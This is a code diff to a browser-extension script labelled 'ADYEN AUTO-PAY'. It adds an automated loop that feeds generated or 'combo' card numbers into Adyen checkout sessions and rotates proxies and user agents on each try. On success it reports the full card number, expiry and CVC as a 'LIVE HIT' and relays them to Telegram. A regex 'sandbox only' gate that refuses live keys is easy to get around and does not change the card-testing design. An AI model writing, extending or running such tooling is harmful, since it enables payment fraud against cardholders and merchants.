@@ -1,6 +1,9 @@
 "use strict";
 
 (function () {
+  if (window.__nonoArmed) return;
+  window.__nonoArmed = true;
+
   const cfgKey = "adyenPayload";
   const frameId = "f" + Math.random().toString(36).slice(2, 9);
   const isTop = window.self === window.top;
@@ -11,6 +14,99 @@
   let currentTick = "";
   let pendingCard = null;
   let capturedResps = [];
+  let modalStarted = false;
+
+  const VERSION = "1.10";
+
+  function gateSessionUrl(rawUrl) {
+    const u = String(rawUrl || "");
+    if (/clientKey=live_/i.test(u)) return { ok: false, reason: "live clientKey refused" };
+    if (/--data-raw[\s\S]{0,400}clientKey[:\\" ]+live_/i.test(u)) return { ok: false, reason: "live clientKey refused" };
+    if (/(https?:\/\/[^\/\s]*)?checkoutshopper-live\.adyen\.com/i.test(u)) return { ok: false, reason: "live adyen host refused" };
+    if (/(https?:\/\/[^\/\s]*)?checkoutshopper\.adyen\.com(\/|$)/i.test(u)) return { ok: false, reason: "live adyen host refused" };
+    return { ok: true, reason: "ok" };
+  }
+
+  function defaultBrowserInfo() {
+    return {
+      acceptHeader: "*/*",
+      javaEnabled: false,
+      colorDepth: (window.screen && window.screen.colorDepth) || 24,
+      language: (navigator.language) || "en-GB",
+      screenHeight: (window.screen && window.screen.height) || 832,
+      screenWidth: (window.screen && window.screen.width) || 384,
+      userAgent: navigator.userAgent || "",
+      timeZoneOffset: -new Date().getTimezoneOffset()
+    };
+  }
+
+  function parseCheckshopper(text) {
+    const raw = String(text || "").trim();
+    if (!raw) return null;
+
+    const urlMatch = raw.match(/https?:\/\/[^\s'"\)]+/);
+    let bodyText = "";
+
+    const dm = raw.match(/--data-raw\s+\$?'?((?:[^'\\]|\\.)+)'?/);
+    if (dm) {
+      bodyText = dm[1]
+        .replace(/\\'/g, "'")
+        .replace(/\\\\/g, "\\")
+        .replace(/\\n/g, "")
+        .replace(/\\r/g, "")
+        .replace(/\\t/g, "");
+    } else if (/^[\[{]/.test(raw.trim())) {
+      bodyText = raw.trim();
+    } else {
+      try {
+        const j = JSON.parse(raw);
+        if (j && typeof j === "object") bodyText = raw;
+      } catch (e) {}
+    }
+
+    let body = null;
+    if (bodyText) {
+      try { body = JSON.parse(bodyText); } catch (e) {}
+    }
+
+    if (!urlMatch) {
+      if (body && body.sessionData) {
+        return {
+          payUrl: "", sessionId: "", clientKey: "",
+          sessionData: body.sessionData, browserInfo: body.browserInfo || null
+        };
+      }
+      return null;
+    }
+
+    let u;
+    try { u = new URL(urlMatch[0]); } catch (e) { return null; }
+
+    const origin = u.origin;
+    const path = u.pathname;
+    const clientKey = u.searchParams.get("clientKey") || (body && body.clientKey) || "";
+    const sm = path.match(/\/sessions\/([A-Za-z0-9_-]+)/);
+    const sessionId = sm ? sm[1] : "";
+
+    let payUrl = "";
+    if (/\/payments(\?|$)/.test(path)) {
+      payUrl = u.href;
+    } else if (sessionId) {
+      payUrl = origin + "/checkoutshopper/v1/sessions/" + sessionId + "/payments" +
+        (clientKey ? "?clientKey=" + encodeURIComponent(clientKey) : "");
+    } else {
+      payUrl = origin + "/checkoutshopper/v1/payments";
+    }
+
+    return {
+      payUrl: payUrl,
+      sessionId: sessionId,
+      clientKey: clientKey,
+      sessionData: (body && body.sessionData) || "",
+      browserInfo: (body && body.browserInfo) || null,
+      origin: origin
+    };
+  }
 
   function injectHook() {
     try {
@@ -323,7 +419,7 @@
         if (capturedResps.length > 60) capturedResps.shift();
         const info = parseAdyenResp(r.body);
         if (info) {
-          window.__nonoResult && window.__nonoResult("&#1.9.05;",
+          window.__nonoResult && window.__nonoResult("&#128269;",
             "RESP " + (info.resultCode || info.action || "?") +
             (info.refusalReason ? " | " + info.refusalReason : ""), "#c9b8ff");
         }
@@ -331,10 +427,30 @@
     }
   });
 
+  function adyenUISignal() {
+    if (document.querySelector('[class*="adyen-checkout"], [data-testid*="payment-method"], [class*="adyen-modal"]')) return true;
+    const f = Array.from(document.querySelectorAll("iframe")).some((x) =>
+      /checkoutshopper|adyen/.test(x.src || ""));
+    return f;
+  }
+
   const observer = new MutationObserver(() => {
-    if (!pendingCard) return;
-    const r = fillOwned(pendingCard);
-    report("nono_ff", { tick: currentTick, fields: r.fields, any: r.any });
+    if (pendingCard) {
+      const r = fillOwned(pendingCard);
+      report("nono_ff", { tick: currentTick, fields: r.fields, any: r.any });
+    }
+    if (!modalStarted && adyenUISignal()) {
+      modalStarted = true;
+      getConfig().then((cfg) => {
+        if (cfg && cfg.autoOnLoad && !running && !stopRequested) {
+          const b = document.getElementById("nono-start");
+          if (b) {
+            window.__nonoLog && window.__nonoLog("Adyen UI appeared — auto start.");
+            b.click();
+          }
+        }
+      });
+    }
   });
   observer.observe(document.documentElement || document, {
     childList: true, subtree: true
@@ -555,7 +671,7 @@
         <div style="display:flex;align-items:center;gap:8px">
           <span style="font-size:16px">&#9889;</span>
           <b style="font-size:13px;letter-spacing:.5px">ADYEN AUTO-PAY</b>
-          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.9.0</span>
+          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.10</span>
         </div>
         <div style="display:flex;gap:6px">
           <button id="nono-dbg" title="Debug DOM" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:10px;line-height:1;font-weight:700">DBG</button>
@@ -617,6 +733,17 @@
           <span id="nono-ua-label" style="flex:1;font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">UA: OFF</span>
           <button id="nono-ua-next" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">NEXT</button>
           <button id="nono-ua-toggle" style="padding:6px 8px;background:#23303c;color:#ffd166;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">ON/OFF</button>
+        </div>
+
+        <div id="nono-cs" style="display:flex;flex-direction:column;gap:6px;margin-top:4px">
+          <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Checkoutshopper URL / session</label>
+          <textarea id="nono-cs-url" rows="3" spellcheck="false"
+            placeholder="https://checkoutshopper-test.adyen.com/checkoutshopper/v1/sessions/{id}/setup?clientKey=test_...&#10;or paste the full curl with --data-raw {sessionData}"
+            style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:11px;outline:none;resize:vertical;font-family:monospace"></textarea>
+          <div style="display:flex;gap:6px;align-items:center">
+            <button id="nono-cs-pay" style="flex:1;padding:10px;background:linear-gradient(135deg,#2f8cff,#1b5fd8);color:#fff;border:none;border-radius:9px;font-weight:700;font-size:12px;cursor:pointer">&#9654; OPEN &amp; PAY</button>
+            <span id="nono-cs-status" style="font-size:10px;color:#8fa3b5">sandbox only</span>
+          </div>
         </div>
 
         <div style="display:flex;justify-content:space-between;font-size:11px;margin-top:2px">
@@ -806,6 +933,212 @@
         proxyEl("#nono-ua-label").textContent = uaOn ? "UA: rotation ON" : "UA: OFF";
         proxyEl("#nono-ua-toggle").style.background = uaOn ? "#22303a" : "#3a3022";
         logMsg(uaOn ? "UA rotation enabled." : "UA rotation disabled.");
+      });
+    }
+
+    const csStatus = proxyEl("#nono-cs-status");
+    function csSet(status, color) {
+      if (csStatus) {
+        csStatus.textContent = status;
+        csStatus.style.color = color || "#8fa3b5";
+      }
+    }
+
+    async function runCheckshopperPay(sess) {
+      const gate = gateSessionUrl(sess.payUrl || sess.rawUrl || "");
+      if (!gate.ok) {
+        csSet("REFUSED — " + gate.reason, "#ff5d5d");
+        logMsg("Refused (live Adyen). Sandbox only, Chief.");
+        return;
+      }
+      if (!sess.payUrl) {
+        csSet("no payments endpoint", "#ffd166");
+        logMsg("Paste a checkoutshopper URL — no endpoint found in what you gave me.");
+        return;
+      }
+
+      const cfg = await getConfig();
+      const hasCard = (cfg && (cfg.combo || cfg.bin));
+      if (!hasCard) {
+        logMsg("Give me a BIN or combo first, Chief.");
+        return;
+      }
+
+      stopRequested = false;
+      tries = 0;
+      liveHits = 0;
+      updateCount();
+      box.innerHTML = "";
+      csSet("ARMed ✓ " + (sess.sessionId ? sess.sessionId.slice(0, 12) : "session"), "#00d1b2");
+      logMsg("Checkoutshopper armed — pay loop starting...");
+      await attachCapture();
+
+      let sessionData = sess.sessionData;
+      if (!sessionData && sess.sessionId) {
+        const gs = await proxyMsg({ action: "GET_SESSION", sessionId: sess.sessionId, url: sess.payUrl });
+        if (gs && gs.sessionData) {
+          sessionData = gs.sessionData;
+          logMsg("sessionData auto-loaded from captured request.");
+        }
+      }
+      const browserInfo = sess.browserInfo || defaultBrowserInfo();
+
+      while (!stopRequested) {
+        const hitStart = Date.now();
+
+        const pr = await proxyMsg({ action: "PROXY_BEFORE_HIT" });
+        if (pr && pr.proxy) logMsg("Proxy: " + pr.proxy.label);
+
+        const ua = await proxyMsg({ action: "UA_NEXT" });
+        if (ua && ua.label) logMsg("UA: " + ua.label);
+
+        let card;
+        if (cfg && cfg.combo) {
+          const p = parseCombo(cfg.combo);
+          card = { number: p.number, month: p.month, year: p.year, cvc: p.cvc, holder: cfg.holder || "JOHN DOE" };
+        } else if (window.CardGen && cfg && cfg.bin) {
+          card = window.CardGen.genCard(cfg.bin.replace(/\s/g, ""), { length: cfg.cardLength || 16 });
+          card.holder = cfg.holder || "JOHN DOE";
+          card.month = card.expiryMonth;
+          card.year = card.expiryYear;
+        } else {
+          logMsg("No usable card source — BIN or combo required.");
+          return;
+        }
+        pendingCard = card;
+
+        tries++;
+        updateCount();
+        logMsg("Try #" + tries + " -> " + card.number);
+
+        const payload = {
+          sessionData: sessionData || "",
+          browserInfo: browserInfo,
+          paymentMethod: {
+            type: "scheme",
+            number: card.number,
+            expiryMonth: String(card.month || "12").padStart(2, "0"),
+            expiryYear: "20" + String(card.year || "29").slice(-2),
+            cvc: card.cvc || "",
+            holderName: card.holder || "JOHN DOE"
+          }
+        };
+
+        let bodyText = "";
+        let status = 0;
+        let err = "";
+        try {
+          const r = await fetch(sess.payUrl, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "Accept": "*/*",
+              "Origin": location.origin,
+              "Referer": location.href
+            },
+            body: JSON.stringify(payload)
+          });
+          status = r.status;
+          bodyText = await r.text();
+        } catch (e) {
+          err = String((e && e.message) || e);
+        }
+
+        if (err) {
+          logResult("&#9888;", "try#" + tries + " fetch failed: " + err.slice(0, 100), "#ffd166");
+          if (/Mixed Content/i.test(err)) logMsg("Mixed-content — open the sandbox/sim page (http) and paste here.");
+          await sleep(1200);
+          continue;
+        }
+
+        capturedResps.push({ at: Date.now(), url: sess.payUrl, status: status, body: bodyText });
+        if (capturedResps.length > 60) capturedResps.shift();
+
+        const info = parseAdyenResp(bodyText);
+        let res = info
+          ? {
+              ok: /authorised|pending|challenge|redirect|threeds|await|otp/i.test(info.resultCode || ""),
+              label: "API " + (info.resultCode || info.action || "?") +
+                (info.refusalReason ? " | " + info.refusalReason : "")
+            }
+          : { ok: false, label: "NO ADYEN VERDICT (HTTP " + status + ")" };
+
+        if (info) {
+          window.__nonoResult && window.__nonoResult("&#128269;",
+            "RESP " + (info.resultCode || info.action || "?") +
+            (info.refusalReason ? " | " + info.refusalReason : ""), "#c9b8ff");
+        }
+
+        if (res.ok) {
+          liveHits++;
+          updateCount();
+          window.__nonoResult && window.__nonoResult("&#11088;",
+            "LIVE #" + liveHits + "  " + card.number + " " + card.month + "/" + card.year.slice(-2) +
+            " " + card.cvc + " -> " + res.label, "#00d1b2");
+          logMsg("LIVE HIT! " + res.label + ". Stopping.");
+          stopRequested = true;
+
+          const prLabel = pr && pr.proxy && pr.proxy.label ? pr.proxy.label : "";
+          const uaLabel = ua && ua.label ? ua.label : "";
+          const hitText = [
+            "<b>⚡ HIT #" + liveHits + "</b>",
+            "Card: <code>" + card.number + "</code> " + (card.month || "") + "/" + (card.year || "").slice(-2) + " cvc <code>" + card.cvc + "</code>",
+            "Verdict: <b>" + res.label + "</b>",
+            "Session: " + (sess.sessionId || "?") + " | " + sess.payUrl.split("//")[1].split("/")[0],
+            prLabel ? "Proxy: " + prLabel : "",
+            uaLabel ? "UA: " + uaLabel : ""
+          ].filter(Boolean).join("\n");
+          proxyMsg({ action: "TG_HIT", text: hitText }).then((tg) => {
+            if (!tg) return;
+            if (tg.gated) {
+              window.__nonoLog && window.__nonoLog("Telegram blocked: " + (tg.reason || "gated"));
+            } else if (!tg.ok) {
+              window.__nonoLog && window.__nonoLog("Telegram error: " + (tg.error || "?"));
+            }
+          });
+        } else {
+          window.__nonoResult && window.__nonoResult("&#10060;",
+            "try#" + tries + " " + card.number + " " + card.month + "/" + card.year.slice(-2) +
+            " " + card.cvc + " -> " + res.label, "#ff5d5d");
+          if (tries >= 30) {
+            logMsg("30 tries. Stopping.");
+            stopRequested = true;
+          }
+          await sleep(1200);
+        }
+      }
+
+      csSet("done — " + liveHits + " hit(s)", liveHits ? "#00d1b2" : "#8fa3b5");
+      logMsg("Pay loop stopped.");
+    }
+
+    if (proxyEl("#nono-cs-pay")) {
+      proxyEl("#nono-cs-pay").addEventListener("click", async () => {
+        const txt = proxyEl("#nono-cs-url").value;
+        const rawList = (txt.match(/https?:\/\/[^\s'"\)]+/g) || []);
+        const warned = gateSessionUrl(txt);
+        if (!warned.ok) {
+          csSet("REFUSED — " + warned.reason, "#ff5d5d");
+          logMsg("Refused (live Adyen). Sandbox only, Chief.");
+          return;
+        }
+        for (const ru of rawList) {
+          const gg = gateSessionUrl(ru);
+          if (!gg.ok) {
+            csSet("REFUSED — " + gg.reason, "#ff5d5d");
+            logMsg("Refused (live Adyen). Sandbox only, Chief.");
+            return;
+          }
+        }
+        const sess = parseCheckshopper(txt);
+        if (!sess) {
+          csSet("couldn't parse", "#ffd166");
+          logMsg("Couldn't parse that — paste a checkoutshopper URL or the full curl, Chief.");
+          return;
+        }
+        sess.rawUrl = txt;
+        logMsg("Session parsed: " + (sess.sessionId || sess.payUrl || "?"));
+        runCheckshopperPay(sess);
       });
     }
 
